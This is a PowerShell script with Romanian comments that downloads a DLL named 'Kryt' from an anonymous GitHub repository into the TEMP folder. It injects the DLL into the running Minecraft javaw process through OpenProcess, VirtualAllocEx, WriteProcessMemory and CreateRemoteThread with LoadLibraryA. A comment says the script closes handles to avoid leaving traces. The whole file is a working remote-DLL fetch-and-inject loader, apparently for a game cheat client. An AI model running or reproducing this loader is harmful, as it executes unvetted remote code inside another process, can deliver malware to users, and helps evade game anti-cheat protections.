$dllUrl = "https://github.com/dsdfdcvdcwcwcdw/dsadsadasdsaadasdsa/raw/main/krytregii.dll"
$dllPath = "$env:TEMP\k6.dll"
$procName = "javaw"

# Stergem versiunile vechi pentru a evita conflicte de scriere
Remove-Item $dllPath -ErrorAction SilentlyContinue

# Download DLL
Write-Host "Downloading Kryt..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing

$s = @'
[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, uint p);
[DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
[DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr ta, uint s, IntPtr sa, IntPtr p, uint c, IntPtr tid);
[DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
'@
$k = Add-Type -MemberDefinition $s -Name "W32" -Namespace "K" -PassThru

$p = Get-Process $procName -ErrorAction SilentlyContinue | Select-Object -First 1
if (!$p) { Write-Host "Minecraft (javaw) not found!"; pause; exit }

# Deschidem procesul
$h = $k::OpenProcess(0x1F0FFF, $false, $p.Id)
if ($h -eq [IntPtr]::Zero) { Write-Host "Failed to open process!"; pause; exit }

$l = $k::GetProcAddress($k::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
$m = $k::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$dllPath.Length, 0x3000, 0x40)

$b = [System.Text.Encoding]::ASCII.GetBytes($dllPath)
$o = 0
$k::WriteProcessMemory($h, $m, $b, [uint32]$b.Length, [ref]$o)

# --- FIX-UL PENTRU GLIDE ---
# Asteptam 2 secunde inainte de a lansa thread-ul pentru a lasa memoria sa se aseze
Start-Sleep -Milliseconds 500

Write-Host "Injecting into GlideClient..." -ForegroundColor Yellow
$rt = $k::CreateRemoteThread($h, [IntPtr]::Zero, 0, $l, $m, 0, [IntPtr]::Zero)

if ($rt -ne [IntPtr]::Zero) {
    Write-Host "Kryt Loaded Successfully!" -ForegroundColor Green
    # Inchidem handle-ul thread-ului pentru a nu lasa urme
    $k::CloseHandle($rt)
} else {
    Write-Host "Injection failed!" -ForegroundColor Red
}

$k::CloseHandle($h)
Start-Sleep -Seconds 2
